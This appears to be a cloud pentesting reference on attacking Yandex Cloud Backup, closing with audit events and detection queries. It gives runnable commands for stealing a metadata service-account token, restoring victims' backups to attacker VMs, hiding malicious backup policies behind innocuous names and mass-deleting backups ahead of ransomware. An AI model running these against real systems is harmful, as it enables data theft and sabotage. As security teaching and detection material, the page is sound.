# Yandex Cloud - Backup Techniques

## Service Overview

Yandex Cloud Backup creates application-consistent backups of Compute Cloud VMs and BareMetal servers. It uses the **Cyberprotect** provider and stores backup data in internal Object Storage buckets that cannot be accessed directly — Cloud Backup is the only restoration path. The backup agent installed on VMs communicates with the provider using a linked service account with `backup.editor` role.

Key concepts:
- **Backup Policies** define schedule, backup type (full/incremental), and retention settings
- **Archives** group all backups for one VM under a single policy
- **Application-consistent backups** capture in-flight writes, meaning restored VMs have complete application state
- Backups can be restored to **different VMs** within the same folder (non-native recovery)
- File-by-file recovery allows extracting specific files from any backup to any connected VM

---

## Enumeration

### Enumerate Protected Resources

```bash
# List all VMs connected to Cloud Backup
yc backup vm list

# List BareMetal servers
yc backup vm list --type bms

# Get VM backup details
yc backup vm get <VM-ID>

# List policies applied to a VM
yc backup vm list-policies <VM-ID>

# List policies that could be applied
yc backup vm list-applicable-policies <VM-ID>

# List backup tasks for a VM
yc backup vm list-tasks <VM-ID>
```

### Enumerate Backup Policies

```bash
# List all backup policies
yc backup policy list

# Get policy details (schedule, retention, type)
yc backup policy get <POLICY-ID>

# List which VMs are bound to a policy
yc backup policy list-applications --policy-id <POLICY-ID>

# List policies for a specific VM
yc backup policy list-applications --instance-id <VM-ID>
```

### Enumerate Backups

```bash
# List all backups
yc backup backup list

# List backups for a specific VM
yc backup backup list --instance-id <VM-ID>

# List backup archives
yc backup backup list-archives
yc backup backup list-archives --instance-id <VM-ID>

# Get backup details (disk layout, partitions, sizes)
yc backup backup get --backup-id <BACKUP-ID>
```

---

## Credential Access

### Service Account Pivoting via Backup Agent

VMs connected to Cloud Backup must have a linked service account with `backup.editor`. Compromising a VM's metadata endpoint exposes this SA, granting backup management across the folder:

```bash
# From compromised VM, get the service account token
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Use token to list all backups in the folder
yc backup backup list --iam-token <TOKEN>

# List all connected VMs
yc backup vm list --iam-token <TOKEN>
```

### Data Exfiltration via Backup Restoration

Restore a target VM's backup to an attacker-controlled VM to access its entire disk contents:

```bash
# Step 1: Find target VM's backups
yc backup backup list --instance-id <TARGET-VM-ID>

# Step 2: Restore to attacker VM (must be connected to Cloud Backup, same folder)
yc backup backup recover \
  --source-backup-id <BACKUP-ID> \
  --destination-instance-id <ATTACKER-VM-ID>
```

The attacker VM now has the target's complete disk — including credentials, database files, application secrets, and SSH keys.

### File-by-File Recovery

Extract specific files from any backup to any connected VM without full restoration:

```bash
# Restore specific files/directories to a custom path on attacker VM
# Available via console — select backup, choose files, specify target VM and path
# Options: restore to original paths, custom directory, overwrite modes
```

---

## Privilege Escalation

### Agent Installation as Remote Code Execution

The `yc backup agent install` command SSHes into a VM to install packages and execute scripts. With appropriate compute and backup permissions, this is effectively RCE:

```bash
# Install backup agent on target VM (requires OS Login SSH access)
yc backup agent install \
  --id <TARGET-VM-ID> \
  --policy-ids <ATTACKER-POLICY-ID>
```

### Policy Manipulation for Persistent Access

Create a policy with aggressive backup frequency to maintain fresh copies of target VM data:

```bash
# Create attacker policy with hourly backups and long retention
yc backup policy create \
  --name "monitoring-policy" \
  --settings-from-file attacker-policy.json
```

---

## Lateral Movement

### Cross-VM Data Access via Non-Native Recovery

A backup from one VM can be restored to a **different** VM in the same folder. Requirements:
- Both VMs must be connected to Cloud Backup
- Target VM OS must match source VM OS
- Target boot disk must be >= source boot disk
- Target VM must be in `Running` status

```bash
# Restore target VM backup to attacker VM
yc backup backup recover \
  --source-backup-id <TARGET-BACKUP-ID> \
  --destination-instance-id <ATTACKER-VM-ID>
```

After restoration, the attacker VM contains the target's complete filesystem — including:
- Application credentials and config files
- Database data files
- SSH keys and certificates
- Service account key files
- Environment variables and secrets

### Enumerate Backup Disk Layout for Reconnaissance

```bash
# View disk layout of any backup (partitions, mount points, free space)
yc backup backup get --backup-id <BACKUP-ID>
```

Returns vault_id, archive_id, size, and complete disk layout including partition info, mount points, bootable/system flags.

---

## Persistence

### Backup Policy as Exfiltration Channel

Create a backup policy bound to target VMs to maintain ongoing access to their data:

```bash
# Create attacker policy
yc backup policy create \
  --name "compliance-backup" \
  --settings-from-file policy.json

# Apply to target VMs
yc backup policy apply <POLICY-ID> \
  --instance-ids <TARGET-VM-1>,<TARGET-VM-2>
```

Periodically restore the latest backup to an attacker VM to access fresh data.

### VM Registration Hijack

Reinstall the backup agent to re-register a VM under attacker-controlled policies:

```bash
yc backup agent reinstall --id <VM-ID>
```

---

## Post-Exploitation

### Backup Destruction (Pre-Ransomware)

Eliminate recovery capability before a destructive attack:

```bash
# Step 1: Revoke policies from all VMs (stops future backups)
yc backup policy revoke <POLICY-ID> \
  --instance-ids <VM-1>,<VM-2>,<VM-3>

# Step 2: Delete all backups by archive
yc backup backup batch-delete --archive-id <ARCHIVE-ID>

# Step 3: Delete backup policies
yc backup policy delete <POLICY-ID>

# Step 4: Remove VMs from Cloud Backup entirely
yc backup vm delete <VM-ID>
```

### Weaken Backup Retention

Subtly modify retention policies so backups auto-expire quickly:

```bash
# Set retention to minimum — only keep 1 backup
yc backup policy update <POLICY-ID> \
  --set-retention-max-count 1

# Or expire backups after 1 hour
yc backup policy update <POLICY-ID> \
  --set-retention-max-hours 1
```

### Disable Backup Compression

Increase storage costs and slow down backup operations:

```bash
yc backup policy update <POLICY-ID> \
  --set-compression off
```

### Service Disruption

```bash
# Remove VM from Cloud Backup (VM keeps running, but loses backup protection)
yc backup vm delete <VM-ID>

# Delete all backups for a VM+policy combination
yc backup backup batch-delete \
  --instance-id <VM-ID> \
  --policy-id <POLICY-ID>
```

---

## Key IAM Roles

| Role | Capabilities |
|---|---|
| `backup.auditor` | View providers, policies, connected VMs, quotas |
| `backup.viewer` | Auditor + view backup records and access permissions |
| `backup.user` | Auditor + connect providers, connect/disconnect VMs, link/unlink policies |
| `backup.editor` | Viewer + User + create/modify/delete policies, execute policies, delete backups, **restore VMs** |
| `backup.admin` | Editor + manage IAM access on backup policies |

`backup.editor` is the primary attack role — it grants backup restoration (data exfiltration), deletion (destruction), and policy manipulation.

---

## Detection and Logging

### Audit Trail Events

Source: `yandex.cloud.audit.backup.*`

| Event | Description | Security Relevance |
|---|---|---|
| `ApplyPolicy` | Applying backup policy to VMs | Attacker attaching malicious policy |
| `CreatePolicy` | Creating backup policy | Attacker creating exfiltration policy |
| `UpdatePolicy` | Updating backup policy | **Weakening retention settings** |
| `DeletePolicy` | Deleting backup policy | Removing backup protection |
| `RevokePolicy` | Revoking policy from VMs | **Removing backup protection from VMs** |
| `ExecutePolicy` | Executing policy on-demand | Triggering immediate backup |
| `StartRecoverBackup` | Starting recovery from backup | **Data exfiltration via restore** |
| `DeleteBackup` | Deleting a backup | Destroying recovery capability |
| `DeleteArchive` | Deleting entire archive | **Mass backup destruction** |
| `DeleteResource` | Removing VM from Cloud Backup | Disconnecting VM from protection |
| `InitResource` / `RegisterResource` | VM connection to Cloud Backup | New resource enrollment |
| `CreateDirectory` | Creating directory on VM | File-by-file recovery operation |
| `UpdateResource` | Updating connection status | Status changes |

### Detection Queries

**Detect backup destruction**:
```
event_type IN ("DeleteBackup", "DeleteArchive", "RevokePolicy", "DeletePolicy")
```

**Detect cross-VM restoration (data exfiltration)**:
```
event_type = "StartRecoverBackup"
-- Alert when source and destination instance IDs differ
```

**Detect retention weakening**:
```
event_type = "UpdatePolicy"
-- Monitor for reduced retention values
```

### Key Detection Gaps

- Backup storage is in internal Object Storage buckets — no direct access logs
- File-by-file recovery details (which files were extracted) may not be fully captured in audit events
- Agent debug-info command reads installation logs via SSH — not captured as a backup audit event

---

## References

- Cloud Backup Concepts: `en/backup/concepts/index.md`
- Backup Agent: `en/backup/concepts/agent.md`
- Backup Types: `en/backup/concepts/backup.md`
- Backup Policies: `en/backup/concepts/policy.md`
- VM Connection: `en/backup/concepts/vm-connection.md`
- Non-Native Recovery: `en/backup/operations/backup-vm/non-native-recovery.md`
- File-by-File Recovery: `en/backup/operations/backup-vm/recover-file-by-file.md`
- Backup Security: `en/backup/security/`
- CLI Reference: `en/backup/cli-ref/`
- Audit Events: `en/_includes/audit-trails/events/backup-events.md`
